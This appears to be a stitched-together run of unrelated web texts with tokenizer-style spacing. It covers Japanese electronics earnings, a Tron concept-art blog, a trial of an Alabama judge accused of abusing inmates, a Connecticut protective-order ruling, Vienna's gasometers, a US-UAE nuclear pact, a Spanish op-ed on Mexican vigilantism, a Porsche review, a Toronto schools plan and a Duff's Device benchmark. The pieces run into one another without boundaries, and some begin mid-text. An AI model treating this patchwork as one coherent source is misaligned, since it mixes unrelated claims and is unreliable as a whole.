Nintendo , the world 's biggest maker of videogame machines , said this week that its first - half profits had plunged by more than 50 % due to sluggish sales of the once - dominant console and lowered its annual profit forecast by a quarter .
Sony , like other Japanese manufacturers , has seen its profits hit hard by the rise of the yen against the dollar and the euro .
The Japanese currency 's appreciation wiped ¥ 77bn from quarterly operating profit , Sony said .
But Mitsushige Akino , chief fund manager at Ichiyoshi Investment Management in Tokyo , said the firm could have further lowered its estimated losses for this year given the clear improvement in demand .
" In April to June and July to September , there was a sense that external conditions improved , and the euro did n't fall that much against the yen , so I thought they could have raised their forecasts a bit more , " he said .
" I think the company is being cautious . "
Sony 's Welsh - born chief executive , Sir Howard Stringer , has imposed a tough cost - cutting regime and refocused attention on the group 's electronics business in to challenge rivals such as Apple .
Sony is cutting 16,000 jobs and closing eight factories worldwide in an attempt to return to profit .
" The restructuring of our business is progressing smoothly on schedule , " Nobuyuki Oneda , the company 's chief financial officer , told reporters .
Sony said its electronics and device divisions turned a profit in the second quarter , but that its flat - screen TV and game chip concerns had been hit by lower prices .
Analysts said the consumer electronics industry 's woes were expected to continue this year , but a modest recovery in the sector offered cause for optimism .
Toshiba , Japan 's biggest microchip manufacturer , said its semiconductor business returned to profit in the second quarter from cost cuts and better price stability , but warned that demand could weaken again .
It has benefited from the popularity of Apple 's iPhone and Sony 's PlayStation 3 game console – both of which use its chips – but kept its full - year forecast for its electronic devices division to a ¥ 60bn loss .
Panasonic reported its first profit in three quarters , boosted by sales of DVD recorders and energy - efficient fridges , as consumers took advantage of government subsidies for eco-friendly appliances .
It made an operating profit of ¥ 49.1bn in the second quarter , down from ¥ 118.6 bn a year earlier , and raised its full - year profit forecast by 60 % to ¥ 120bn .
As promised this week , I worked on some concept art for the Tron light - cycle .
The original light - cycle has to be one of the coolest looking vehicles in movie history .
In the top three at least , next to the X - wing and the dog van from Dumb and Dumber .
Anyways , I really wanted to draw the crotch rocket version of the light - cycle but the demon voices in my head kept telling me “ Stop sucking and do something unique ” .
So then it hit me , would n’t it be sweet if there were a chopper version of the light cycle ?
It was a little tough to keep the tech look with the chopper feel but it worked out pretty well .
The hardest part was finding a place to attach the handlebars and make them look in place .
Wrapping them around the wheel and connecting them in the wheel well became the best solution .
I ’m also a fan of the barbwire detailing on the gas tank too .
That accent really seemed to combine Tron and the chopper feel .
Originally , I started with blue highlights but decided to go red to keep with the bad boy feel .
Finally the fire red / orange jet stream is a nod to the Ghost Rider .
Come back next week to see my version of the Recognizers .
I ’ve been having a good time with the last two Tron sketches so why not go with it ?
See ya in a week .
A
( CNN ) --
A former Alabama judge is standing trial on charges he checked male inmates out of jail and forced them to engage in sexual activity such as paddling in exchange for leniency .
Former Mobile County Circuit Judge Herman
Thomas denies all the charges , his attorney says .
Former Mobile County Circuit Judge Herman
Thomas at one point faced more than 100 criminal counts in the case , including kidnapping , sexual abuse , extortion and sodomy .
Prosecutors filed cases relating to 15 alleged victims , with multiple counts in each case .
But four of those cases have been dismissed -- some thrown out by a judge because the statute of limitations expired and others because prosecutors decided not to present evidence relating to them -- leaving 11 alleged victims and 51 counts , according to defense attorney Robert Clark and CNN affiliate WKRG - TV .
Retired Marengo County Judge Claud Neilson dismissed jurors Tuesday while attorneys argued whether the jury should be allowed to consider kidnapping , extortion or assault charges , WKRG reported .
Neilson already has ruled there is enough evidence for jurors to consider the sex abuse charges .
Thomas , 48 , has pleaded not guilty and has denied any wrongdoing .
Clark told CNN on Tuesday that Thomas was trying to mentor the inmates and did not assault them .
" The whole thing is , he tried to help people in this community , " Clark said .
" He helped thousands to grow up and be productive citizens . "
The judge does not deny bringing the inmates into his office , Clark said .
" He was mentoring them .
He was trying to get them to do right , to be productive citizens . "
Do n't Miss Jury selection begins in paddling judge case
One of the alleged victims testified Monday that he does n't know why his semen was found on the carpet of a small room used as an office by Thomas , according to The Mobile Press - Register newspaper .
But he did say Thomas spanked him with a belt on several occasions , the newspaper reported , and that the paddlings took place inside a jury room , in the small office and at a Mobile fraternity house .
Another man testified that after he was charged with kidnapping and robbery in 2002 , Thomas visited him in jail and urged the man to let Thomas decide the case instead of a jury , according to the Press - Register .
Thomas convicted him of lesser charges , he testified , and sentenced him to a 90 - day boot camp .
He said Thomas also beat him with a belt on his bare buttocks about a dozen times at the courthouse , the newspaper reported .
Neither man was identified .
" All of them [ the alleged victims ] were given preferential treatment at some point , " Nicki Patterson , chief assistant district attorney for Mobile County , told CNN earlier this month .
" And ultimately , when some of them refused to continue participating [ in the activities ] , they were given what I would view as excessive sentences .
But certainly while the inmates were involved with the activities we allege , the state would say , it was extremely lenient sentences . "
However , " two of the individuals said he [ Thomas ] did nothing bad to them , " Clark said Tuesday .
" That he did n't paddle them .
That he only helped them .
... I mean , the last guy that testified was a murderer .
And he 's complaining he got assaulted .
' I got assaulted , ' -- yeah , right . "
Asked whether Thomas admits paddling the men , Clark said , " I did n't say either way .
... I 'm saying there ai n't no sexual innuendoes . "
Neilson has heard arguments on whether an expert should be allowed to testify about sexual fetishes for the prosecution .
Clark said the expert has not interviewed any of the alleged victims and that he fails to see how the testimony fits into the case .
Neilson was brought in to hear the case after all the Mobile County Circuit judges recused themselves -- standard procedure in a case involving another judge .
Thomas resigned from the bench in October 2007 before he was scheduled to stand trial before the Alabama Court of the Judiciary on multiple ethics violations charges .
The complaint , dismissed after the resignation , accused him of " extrajudiciary personal contact " with some defendants but does not refer to any sexual contact .
In April , Thomas told WKRG the allegations against him are false , but the most important thing for him was making sure his wife and two daughters were taken care of .
" I 'm not guilty , and I look forward to being a part of the community that 's supported me and I 've supported my entire life , " he said .
The Alabama State Bar suspended Thomas ' law license in January after a grand jury handed up the first of two indictments against him .
In April , the bar 's disciplinary commission upheld the suspension , WKRG reported , despite the fact that Thomas under oath denied all the allegations in the first indictment .
The second indictment was returned in August .

Requiring Actual Proof Of Guilt
Men accused of domestic violence can have their children and more taken away from them upon mere accusation -- with no evidence required .
The Connecticut Supreme Court just changed this -- and other states should follow ... and it 's just amazing that this even needs to be said .
Christian Nolan writes for Connecticut Law Tribune that a Stamford man lost his freedom and the right to visit his kids after he was arrested two years ago for allegedly throwing his wife down the stairs and kicking her in the head , supposedly in front of their two toddlers :
But the defendant , Fernando A. , whose full name is not released in court records , said the two were divorcing and his wife fabricated the attack story to gain leverage in family court proceedings .
Fernando A. , however , never got a chance after his arraignment to object to the order of protection issued against him that prevented him from seeing his children .
His lawyer , Steven D. Ecker , of Hartford 's Cowdery , Ecker & Murphy , asked for an evidentiary hearing after the arraignment , but Superior Court Judge James Bingham denied the request .
Ecker challenged the denial up to the state Supreme Court .
In an opinion to be officially released this week , a divided court ruled that a defendant must be granted an evidentiary hearing at which the state must prove , by the civil standard of a preponderance of evidence , that the order of protection is a continued necessity .
" All we were asking for is a hearing within a reasonable time after someone is kicked out of their home and prohibited from any contact with their children , " said Ecker .
" It seems appropriate a court would permit a hearing to consider both sides of the story .
That does n't seem particularly controversial . "
There are about 19,000 protective orders currently in place in Connecticut .
And in a year when domestic violence cases have repeatedly made headlines in the state , it 's no surprise that the Fernando A. appeal drew interest from various advocacy groups , including the Connecticut Coalition Against Domestic Violence and the American Civil Liberties Union of Connecticut .
" Victims should be protected , " said Anne C. Dranginis , of Hartford 's Rome McGuigan .
" In many of these cases , victims have suffered trauma or fear and are trying to calm down children . "
What about when the accusee becomes the victim ?
Loses everything that matters to him , on the sheer weight of he said / she said ?
Domestic abusers , whether they 're men or women , should be punished .
But , let 's join modern legal times , and stop the Salem Witch Trial approach ... countrywide .

History of the Vienna Gas Tanks
The Gasometers of Vienna date back to 1896 when Viennese authorities decided it was time to invest in large - scale gas and electric utilities .
In just three years , the city built Europe ’s largest gas plant ( which included the four gasometers ) and laid more than 500 km ( 300 miles ) of gas lines .
Over time , natural gas replaced coal gas , and the gasometers were no longer needed .
The gas plant was permanently shut down in 1984 .
After their decommission they were used for various purposes , including : a set in the movie James Bond : The Living Daylights and as a venue to host the Gazometer Raves .
Sound in the large round structures reverberated and exhibited a special echo that was popular to the ravers in attendance .
Eventually , Vienna undertook a remodelling and revitalization of the protected monuments ; and in 1995 called for ideas for the new use of the structures .
The chosen designs by the architects Jean Nouvel ( Gasometer A ) , Coop Himmelblau ( Gasometer B ) , Manfred Wehdorn ( Gasometer C ) and Wilhelm Holzbauer ( Gasometer D ) were completed between 1999 and 2001 .
Each gasometer was divided into several zones for living ( apartments in the top ) , working ( offices in the middle floors ) and entertainment and shopping ( shopping malls in the ground floors ) .
The shopping mall levels in each gasometer are connected to the others by skybridges .
The original contract budget was $ 150 million Euros .
The Gasometers Industrial Renovation
The Gasometers are four cylindrical telescopic gas containers , each with a volume of about 90,000 cubic meters or approx .
3.18 million cubic feet .
Each tank is enclosed by a red - brick facade .
They are each 70 meters ( 230 ft ) tall and 60 meters ( 197 ft ) in diameter .
The Gasometers were gutted during the remodelling and only the brick exterior and parts of the roof were left standing .
Additional Features Include :
– Over 70 shops , restaurants , bars and cafes
– A multiplex cinema with 12 screens
– An events hall with room for 4,200 people
– A daycare center
– The Vienna National Archive
– 11,000 square meters ( 118,403 sq ft ) of office space .
– 615 apartments
– A 230 - bed student dormitory

I carried on with a few ideas of what to do with the ragdoll version of my Evolver avatar and I ended up with this interesting behaviour .
Which is sort of where I was heading .
It is a form of emergent behaviour caused but the avatar being suspended by the two top spheres using a form of hinge .
This combined with gravity and the bones and joints in the avatar lead it to create this dancing toy effect that is different each time it is run .
Next is to wire the strings up to touch controls and then I have a full dancing avatar to play with on the iphone .

* Pact takes force after diplomatic notes exchanged
* U.S. industry hopes for big share of UAE nuclear project
WASHINGTON , Oct 22 ( Reuters ) - The United States and United Arab Emirates are finalizing a landmark nuclear power cooperation agreement now that Congress has given its tacit approval , U.S. officials said on Thursday .
“ We are entering into the final stages of efforts to bring the proposed agreement into force , ” State Department spokesman Ian Kelly told reporters .
The pact , which President Barack Obama approved in May and sent to Congress for a 90 - day review period , is potentially worth billions of dollars to General Electric Co GE.N and Westinghouse Electric , a subsidiary of Toshiba Corp 6502.T .
The UAE was the third - largest oil exporter in 2007 .
But it is planning to build a number of nuclear reactors to meet an expected need for an additional 40,000 megawatts and is expected to award the primary contract soon .
The U.S. - UAE Business Council estimates the pact could generate more than $ 40 billion in commercial opportunities and well over 10,000 American jobs .
Congress could have blocked the deal by passing a resolution of disapproval before the end of the 90 - day review period last Saturday .
Despite concerns some lawmakers raised about the UAE ’s relationship with Iran , there was no push in the Senate or House of Representatives for a vote .
The Obama administration calls the pact a model for the region that contains several unprecedented commitments that ensures the UAE will not use American technology to develop a nuclear weapon or to help others in the region do that .
The UAE has pledged not to enrich uranium or reprocess used nuclear fuel and to import all fuel for its nuclear reactors .
The agreement will go into force once the two countries have exchanged diplomatic notes verifying they have fulfilled all the necessary requirements .
“ The next step is to talk to the government of the UAE to see what their own requirements are for us to enter into this formally , ” Kelly said .
U.S. industry official hope that final legal move could be done in the next week to 10 days .
The National Association of Manufacturers and the U.S. Chamber of Commerce hailed the nuclear deal .
“ This agreement will usher in closer commercial ties between the U.S. and the UAE , which is already America ’s top export market in the Arab world , ” said Danny Sebright , president of the U.S. - UAE Business Council .

Frente al vacío no somos muy buenos .
Es más , provoca angustia , y urge rellenarlo .
Con lo que sea .
Para eso tenemos las historias a la mano .
O las creamos .
" Salió de una fiesta ; no era tan tarde .
Bueno , no sé .
Hasta donde pudimos enterarnos .
Era su onomástico .
Apareció muerto , en el arrollo vehicular .
Ahí estaba .
Y ahí quedó . "
La narración acompañada de rabia contenida : perder a un hijo , así , desata lo innombrable .
El alcalde de San Pedro Garza García , en el norteño Estado mexicano de Nuevo León , salta a la notoriedad por su bravuconería , pero , sobre todo , por haber tocado una fibra sensible de la sociedad agraviada : Mauricio Fernández , con su porte de justiciero , un poco de película setentera , habla de " limpieza " , de ir " más allá de la ley " , de atender las demandas de la población .
Todo surge de una anécdota más : al pronunciar su discurso de toma de posesión , el nuevo alcalde informa sobre la muerte de uno de las cabecillas del crimen organizado que más azota la región y que tenía en la mira al propio Fernández .
El alcalde que se estrena tiene información privilegiada : antes que cualquier otra autoridad confirma la muerte del criminal .
Pero además , deja entrever en su discurso la acción de " grupos de limpieza " , porque ya es hora de acabar con el cáncer de la criminalidad que azota a México .
Algunas voces se manifiestan : ¡cuidado con permitir los grupos paramilitares !
La razón se expresa , pero el corazón resiste : el agravio que te coloca ante el vacío no permite matices , y la promesa de mano dura ofrece soluciones inmediatas .
" Fuimos a un centro comercial , con unas amigas .
A pasar el domingo , como solemos hacer .
Cuando llegué a mi casa , me sorprendieron .
Tres o cuatro tipos .
Me llevaron .
Varios días secuestrada .
Lo de menos , me vejaron .
Lo demás , me quitaron todo .
Y ya , no queda de otra . "
La narración acompañada de dolor resignado ; perder el horizonte , así , es indescriptible .
No es México el lugar que inaugura la retórica del hartazgo social ante la delincuencia y la injusticia ; ni tampoco donde se articula por primera vez la solución inmediata de la justicia a mano propia .
Cuando el alcalde norteño habla de la acción de " escuadrones de limpieza " , sabe , me imagino , que toca la sensibilidad de quienes ya no desean esperar más , como ha sucedido siempre y en todos lados .
En un estudio reciente , Consulta Mitofsky revela que 96,6 % de los mexicanos encuestados está de acuerdo con aumentar los castigos contra el crimen ; 76,6 % acepta imponer la pena de muerte en delitos graves ; y , de un 26,3 % en 2007 , ahora son 45 % quienes aceptan que los ciudadanos se hagan justicia por mano propia .
El tiempo parece agotarse .
Si las autoridades no responden , que alguien más , con la virilidad probada , se haga cargo .
Y si hay que aportar , se hace .
" Todo México necesita alcaldes como el de San Pedro , de Nuevo León , entrones y con ganas de sacar a este país adelante , no alcaldes cobardes como ... "
" Bien hecho , Sr. Fernández !
Atender a las necesidades de los ciudadanos y cumplir las promesas hechas es de caballeros , y un caballero como usted es el tipo de políticos que necesitamos en TODO el país ... "
" Apoyo las actuaciones del presidente municipal , ¡muerte a los delincuentes ! "
" Bravo mi alcalde , ¡haga historia y quite a estas basuras de nuestro camino , estamos con usted digan lo que digan ! "
La narración acompañada de la víscera de la ciudadanía , para eso sirven también las redes sociales , el Internet .
Perder la perspectiva , así , es simplemente peligroso .
Me toca organizar una conferencia internacional , vendrán personas de diferentes lugares .
Recibo de pronto una llamada alterada : " preguntan , dice la voz , si es cierto que en México cortan cabezas .
¿ Estamos seguros si vamos para allá ? "
Cómo explicarle que a diario circulo por la Ciudad de México , y mi cabeza está intacta .
Cómo debatirle a las imágenes que llegan a través de los medios de comunicación .
Cómo contrarrestar el vacío informativo de tomadores de decisión que sin duda están ganando batallas , pero que no han podido comunicarlo ni a propios ni a extraños .
Llevo años viviendo en la capital de México , y nunca me ha pasado nada .
Pero la narrativa que impera es otra .
Comenzamos a vivir impregnados de historias de venganza .
" ¡Qué bueno que este alcalde le está poniendo en su m... a las alimañas .
Está en nuestras oraciones .
No se deje amedrentar . "
" Enhorabuena , Sr. Fernández .
Le deseo mucho éxito en su política de cero tolerancia . "
" Que se venga a trabajar al D.F. " .
Las comunicaciones se multiplican y las cadenas electrónicas dan voz a la inquietud ciudadana .
La narración acompañada de su poder de multiplicación ; reconocer la capacidad de sumar voluntades , así , es excitante .
No son , por supuesto , todas , las voces que se suman al aplauso .
La mesura prevalece y hay quienes desde las tribunas más diversas recuerdan la ley y reclaman sosiego .
Pero , insisto , el problema no es la razón , sino la pasión del agraviado .
México pasa hoy por un momento crucial en su definición ciudadana : el reconocimiento de los límites del pulso y los espacios del discernimiento .
El bravucón alcalde norteño sólo recoge una de las facetas de la historia .
La otra , nos toca remarcarla a quienes aún creemos que es sólo a partir de la legalidad que se consolida la convivencia democrática .
El problema sigue siendo el vacío : mientras las autoridades no convenzan con su narrativa , nos veremos obligados a inventar historias .
Y entonces entran a cuadro los justicieros ; y entonces el Estado se convierte en un bando más , no en el definidor de la agenda .
A balazos nunca se ha entendido nadie .
Sólo se mitiga el miedo .
Pero , me consta , este país se merece más .
Y no , si vienen a México no les cortan la cabeza .

Square Enix chief Yoichi Wada is preparing his firm for the demise of physical media – and potentially the death of home consoles .
In an exclusive interview with MCV that will be published next week , the CEO of the publisher – which now owns Eidos and is famous for its epic disc - based Final Fantasy games – said that a dramatic change will come in the next decade offering more opportunity for market growth , but fundamentally transforming the traditional industry .
In ten years ’ time a lot of what we call ‘ console games ’ wo n’t exist , ” he said .
Wada warned that all the distributors and sales firms will suffer a big negative impact ” from a new era in which interactive entertainment switches from software run on hardware in the home to server - based offerings , game streaming and digital distribution .
He claimed that format - holders including Sony and Microsoft are already prepared for the shift – and that third - parties must follow suit .
Somewhere around 2005 the console manufacturers ’ strategy shifted , ” he said .
In the past the platform was hardware , but it has switched to the network .
A time will come when the hardware is n’t even needed anymore .
With that , any kind of terminal becomes a potential platform on which games can be played – that ’s exponential growth in the potential of gaming .
The potential size of the market is enormous . ”
He explained that Square Enix is preparing for this change by ramping up production of social and browser games at its Japanese studios , and also closely monitoring 2010 ’s beta roll - out of PS3 MMO Final Fantasy XIV .
Social and browser games are going to grow dramatically – especially in areas like Asia which does not have as big a console market , ” ?he said .

Michigan has a huge problem with jobs and capital leaving the state for more favorable climates .
Which makes it incredible that the ruling Democrats in the state have this plan to improve things :
Hiking the minimum wage to $ 10 an hour for all workers .
Imposing a blanket moratorium on home foreclosures for 12 months .
Cutting utility rates 20 % across the board .
Requiring all employers to provide health care to their employees .
Hiking , by $ 100 a week , and extending , for six months , unemployment benefits .
Wow , that should really bring companies running to the state to invest their capital .
This is always a powerfully attractive package :
Treasury says the risks surrounding the Government 's new emissions trading scheme have been poorly assessed .
The Climate Change Response ( Moderated Emissions Trading ) Amendment Bill was introduced to Parliament under urgency yesterday and got through its first reading with the support of the Maori Party .
The scheme seeks to limit emissions , which New Zealand is required to do under international agreements .
The Labour government passed an emissions scheme just before last year 's election but National pledged a redesign as it considered Labour 's scheme would be too costly for the economy .
Now Treasury officials say the quality of analysis of the new bill 's impact was " not commensurate with the significance of the proposals " .
There was no clear analytical basis for the proposal to align some key design elements with Australia 's scheme .
They highlighted the dangers of aligning with Australia before Canberra 's scheme had even been finalised .
Almost half of New Zealand 's greenhouse gas emissions come from agriculture , compared with Australia 's heavy reliance on coal - fired power stations .
" Such risks may include the potential impacts on business certainty and investment decisions , and the overall credibility , sustainability and effectiveness of the New Zealand ETS . "
The unusually strong criticisms are included in a preamble to the bill .
National won the backing of the Maori Party for the bill to proceed to a select committee , but talks with Labour on a possible bipartisan deal have collapsed .
The draft bill shows the changes will cost taxpayers $ 415 million by 2013 , before moving into the black over the next four years .
However , as the price of longer - term assistance to big polluters takes effect , the bill for taxpayers blows out to $ 2 billion by 2030 .
Labour 's climate change spokesman , Charles Chauvel , said National was playing a high - stakes game .
" Its scheme will cost taxpayers an additional $ 2 billion up to 2030 and half a billion dollars each year thereafter . "

When SyFy ( ’ sup with the new spelling , fellas ? ) announced the two - hour movie , Battlestar Galactica : The Plan , a prequel - ish take from the Cylon ’s point of view , we practically fraked ourselves — Tricia and Grace are gracing our flat - screens for two more precious hours .
Is providing you with the sexiest photos ever the best way to send off a series that transformed geek to chic ?
Yes , and so say we all .
Since the new Battlestar movie is coming to DVD before TV , can we expect some R- rated action ?
Tricia Helfer :
There will certainly be a lot more explicit action on the DVD .
And I refuse to have a body double , so you will see a little bit of skin from me as the Six character .
There ’s also a new character you ’ll see in some very intense sex scenes .
Grace Park : Yeah , there ’s going to be a T & A version .
Though maybe I should say T , C & A , because it ’s not just girls this time …

Seven feet were previously found along the rugged coast of British Columbia province and the neighbouring US state of Washington , including one later determined to have belonged to a missing man who was depressed .
The other feet discovered include a female pair , a male pair and a male right foot .
Two reality TV wannabes , Michaele and Tareq Salahi , successfully crashed the state dinner President and Mrs. Obama were holding for the Indian Prime Minister , Manmohan Singh and his wife .
Michaele and Tareq Salahi , were not on the guest list and did not set off metal detectors indicating a weapon .
They got pictures with VP Biden , Raham Emmanuel , and others .
The only reason they were caught is that they bragged about it on Facebook .
They looked the part though , dressed to the nines , Michaele even had on a sari .
All this has me thinking of " In the Line of Fire " with John Malkovich and Clint Eastwood .
John 's character had composite weapon that metal detectors could n't find and when he attended the fundraising dinner , he was dressed in a nice fitting tuxedo .
His character intended to kill the POTUS .

Supposedly the problem was at a gate that has since been corrected .
This is serious for not only did it involve a breech of security for President Obama , but for the Prime Minister as well .
What head of state will come when security in this country for OUR president failed so miserably ?
The conspiracy theorists and Obama haters are going to have a field day here .
But for those of us who have been seriously worried for Obama 's safety since the campaign this only increases that fear .

Porsche ’s Boxster and Boxster S just found out they have a long lost brother .
He ’s in better shape than they are , he ’s stronger , and much better looking .
When it rains he puts on a funny looking hat , but that ’s ok , because he only really likes to go outside when it ’s sunny .
He ’s the new Porsche Boxster Spyder , and he ’s already my favorite Boxster .
Let ’s start with the fact that at 2,800 lbs this is the lightest Porsche offered today .
This was achieved by deleting the A/C and radio , and using carbon seats .
The most weight - loss happened above the neck , deleting the convertible top .
Instead there ’s a hand - attached cloth roof .
Frankly , it looks awful , and the fit is just ok .
However , you ’ll quickly forget about it when you drive it .
The mid-mounted engine makes 320 hp and 273 ft-lbs of torque , both 10 higher than the Boxster S. With the PDK transmission sprints to 62 mph happen in 4.8 seconds and you can blow - dry your hair at 166 m ph .
With new 20 mm - lower springs and an LSD , this car will be incredible in the corners .
The Boxster has remained largely the same since its debut in 1997 .
There ’s been small engine upgrades , and little changes to the body , but Porsche left its overall shape alone .
I ’ve never been a big fan of it .
Driving aside , to me it looked like they designed the front , then said , “ Let ’s use that for the back too . ”
Then they put on taillights where the headlights are and headed home early .
This Spyder , though , looks great .
Grabbing the eye are the two humps behind the cockpit , a distinctive design off of the beloved Carrera GT .
Here it fills in the Boxster ’s shape , giving it presence .
New bumpers also distinguish it from its kin , with tasteful accents everywhere .
Top down I think it ’s a great - looking roadster .
As stated before , inside the leather , radio , and A/C are gone .
In their place are performance - oriented accents like the GT3 - esque door pulls .
My favorite are the buttons on the wheel .
One says “ Launch Control ” , and one says “ Sport Plus ” .
Clearly Porsche thinks its buyers will being needing both often .
This car is not a fashion - accessory .
It ’s for driving .
That ’s both a good and bad thing .
At $ 61,200 , the Porsche Boxster Spyder is 3 grand more than a base Boxster S. I think many shoppers would opt for the car that has creature comforts and a decent roof .
Porsches shine as daily drivers , and this deviates from that .
But what this is is an open - aired Cayman S. Same focus of the Cayman with the fun-factor of a roadster .
That is a combination that driving purists will have a hard time turning away from .
It ’s also a fresh look the Boxster needed .
Besides , putting that top on just gives you more time to admire the gorgeous , sculpted power - domes .

Canada 's largest school board is poised to go boy - crazy , with boys - only classes , " boy - friendly " instruction and an all - boys grade school among ways the new director hopes to help young males do better in school .
In a sweeping blueprint unveiled Tuesday on everything from closing schools to curbing violence and hiring a marketing whiz to drum up more students , Toronto District School Board director Chris Spence is urging the board to make boys a priority and work to boost their skills and lower their dropout rate .
" The last thing I want to do is demonize our boys , but all around we see great concerns about their learning , " he said , citing lower test scores than girls and more acting out , so to level the playing field for boys " might require differentiated treatment . "
In " A Vision Of Hope ! " – an ambitious report based on 200 meetings with staff and community members – Spence is calling for more single - sex classes , programs and even schools .
Next September , he wants the board to open a Male Leadership Academy for boys from kindergarten to Grade 3 as a sort of alternative school or " school of choice , " and add a grade each year , with many if not all teachers being male .
Moreover , he wants to launch 300 " demonstration classrooms " across the city to showcase the best ways of teaching , including classrooms he calls " boy - friendly . "
" Boys thrive in environments that are hands - on and where there is opportunity to move around , " he said , citing portable desks that let children be more mobile , and clipboards rather than notebooks so students feel less tied to a desk .
" When every bone in a boy 's body says , ' Move ! ' we 're usually saying , ' Sit down . ' "
The focus on boys comes as little surprise from this former CFL player who has made mentoring boys a trademark of his career as he moved from teacher to director of the Hamilton - Wentworth District School Board , where he was when Toronto hired him this spring after a year - long search .
One of his first teaching assignments in the 1990s was to run a boys - only class at Toronto 's Oakdale Park Middle School , where many boys had little contact with their fathers and showed little interest in school .
Spence made a point of shaking each boy's hand every morning – which took only 20 seconds , but offered a touch of the mentoring he champions to this day .
" I would say , ' Tyrone , today is your day ; I believe in you and I need you to focus , ' " he told the Star earlier this year .
The boys thrived and Spence still keeps in touch with many of them , calling it the " most impactful thing " he has done as an educator .
He went on to pioneer a renowned mentoring program called Boys To Men .
The Toronto board has a handful of single - sex classrooms and a small all - girls high school for students at risk , Heydon Park Secondary School , but Spence wants to expand the model , which he promoted at two schools in Hamilton .
Yet the jury is out on the benefits of single - sex schools .
Serge Demers , an acting vice - president at Laurentian University who has studied the issue for Ontario 's Literacy and Numeracy Secretariat , says if anything , girls benefit more .
" It 's not the magic bullet , " he said .
" In some instances it does work out quite well ; but in fact it works out better for girls than boys – which is the reverse reason of why folks try to implement it . "
Having a few classes where girls and boys are segregated seems to have better results than single - sex schools , he said .
The advocacy group People for Education has raised concerns about specialty schools " because of the tendency for that to divide populations , as opposed to bringing populations together , " said spokeswoman Annie Kidder , citing research in Britain and Canada that shows a system of specialty schools can lead to " a fair amount of social segregation . "
Toronto board chair John Campbell said he expects Spence 's plan to meet with little resistance next week when it comes up for approval by trustees .
" We went through a long search to get a very capable agent of change , and we got one . "
However , Grade 9 student Bowen Pausey gives a thumb 's down to all - boy learning .

Duff ’s Device is one of the most brilliant exploits of C syntax .
It ’s used to unroll loops and save some cycles spent on loop ‘ maintenance ’ .
Let ’s take a look at typical fill_n function :
template RDE_FORCEINLINE
void fill_n ( T * first , size_t n , const T & val ) { for ( size_t i = 0 ; i < n ; ++ i ) first [ i ] = val ; }
; for ( int i = 0 ; i < n ; ++i ) mov ecx , DWORD PTR _n$ [ ebp ] test ecx , ecx jle SHORT $ LN1@NormalTest mov eax , DWORD PTR _first $ [ ebp ] add eax , 8 $ LL3@NormalTest : ; first [ i ] = val ; mov dl , BYTE PTR _val$ [ ebp + 4 ] movss xmm0 , DWORD PTR _val$ [ ebp ] mov BYTE PTR [ eax - 4 ] , dl mov edx , DWORD PTR _val$ [ ebp + 8 ] movss DWORD PTR [ eax - 8 ] , xmm0 mov DWORD PTR [ eax ] , edx add eax , 12 ; 0000000 cH dec ecx jne SHORT $ LL3@NormalTest $ LN1@NormalTest :
Simple enough .
Apart from the job that really has to be done every loop ( copying stuff ) we ’ve 3 additional instructions per loop ( add eax , 12 / dec ecx + jump ) .
Could this overhead be reduced somehow ?
Duff ’s Device has been introduced around 1983 , back when every instruction mattered .
Here is the original post by Tom Duff .
Almost 30 years have passed , do such little tricks still matter nowadays ?
Let ’s try …
Here ’s my version of Duff ’s Device , with 4 - x loop unrolling :
T * last = first + n ; switch ( n & 0x3 ) { case 0 : while ( first != last ) { * first = val ; ++ first ; case 3 : * first = val ; ++ first ; case 2 : * first = val ; ++ first ; case 1 : * first = val ; ++ first ; } }
mov edx , DWORD PTR _n$ [ ebp ] mov eax , DWORD PTR _first $ [ ebp ] ; 627 : switch ( n & 0x3 ) movss xmm0 , DWORD PTR _val$ [ ebp ] mov ecx , edx imul ecx , 12 ; 0000000 cH push ebx mov bl , BYTE PTR _val$ [ ebp + 4 ] and edx , 3 add ecx , eax sub edx , 0 push esi mov esi , DWORD PTR _val$ [ ebp + 8 ] je SHORT $ LN5@DuffsDevic dec edx je SHORT $ LN1@DuffsDevic dec edx je SHORT $ LN2@DuffsDevic dec edx je SHORT $ LN3@DuffsDevic $ LN4@DuffsDevic : pop esi pop ebx pop ebp ret 0 $ LN5@DuffsDevic : ; 629 : case 0 : ; 630 : while ( first != last ) cmp eax , ecx je SHORT $ LN4@DuffsDevic ; 632 : * first = val ; ++ first ; movss DWORD PTR [ eax ] , xmm0 mov BYTE PTR [ eax + 4 ] , bl mov DWORD PTR [ eax + 8 ] , esi add eax , 12 ; 0000000 cH $ LN3@DuffsDevic : ; 633 : case 3 : * first = val ; ++ first ; movss DWORD PTR [ eax ] , xmm0 mov BYTE PTR [ eax + 4 ] , bl mov DWORD PTR [ eax + 8 ] , esi add eax , 12 ; 0000000 cH $ LN2@DuffsDevic : ; 634 : case 2 : * first = val ; ++ first ; movss DWORD PTR [ eax ] , xmm0 mov BYTE PTR [ eax +
4 ] , bl mov DWORD PTR [ eax + 8 ] , esi add eax , 12 ; 0000000 cH $ LN1@DuffsDevic : ; 635 : case 1 : * first = val ; ++ first ; movss DWORD PTR [ eax ] , xmm0 mov BYTE PTR [ eax + 4 ] , bl mov DWORD PTR [ eax + 8 ] , esi add eax , 12 ; 0000000 cH jmp SHORT $ LN5@DuffsDevic
It ’s actually easier to see what ’s going on here .
For 8 x unrolled loop MSVC will use jump table instead of 8 comparisons at the start .
OK , so it ’s a funky way of unrolling loops , but does it make sense to use it these days ?
I performed 50 loops of copying of 200002 ( 200 k + 2 ) elements via ‘ normal ’ loop and Duff ’s Device on my 2.2GHz laptop and got the following results :
standard loop : 70ms ,
Duff ’s Device ( 4x ) : 57ms ,
hand unrolled loop : 54ms
( Would be interesting to see this on PPC ) Obviously , the most important factor is : how expensive is the operation we ’re performing per loop iteration .
The more expensive it is - the smaller gains from unrolling , as overall cost will be dominated by loop body .
I ’d say that nowadays DD is more of a curiosity than something you should be using in production code , but it ’s still good to know what kind of tricks you can pull off in pure ANSI C (+ it gives you better understanding of switch / case statements ) .
Tomasz Dabrowski 2009-10-28 09:22:07
I ’ve done some research and MSVC seems to be very sneaky about unrolling loops .
As far as I understand generated ASM code ( / Ox / arch : SSE2 ) the routine for fill ( data , n , default )
is to copy default to data [ 0 ] , and then perform a rep movsd using overlapping memory block ( so that data [ 1 ] =data [ 0 ] , data [ 2 ] =data [ 1 ] and so on ) .
Should n’t it be faster in most cases ?
Dan Amerson 2009-10-28 13:10:15
I recall someone mentioning Duff ’s Device on the 360 forums and it being discouraged because the switch negatively interacted with the branch prediction and caused a flush of the CPU .

Sean Barrett 2009-10-28 20:23:34
Duff ’s Device should strictly be a historical curiosity at this point .
It ’s a bad way to unroll a loop .
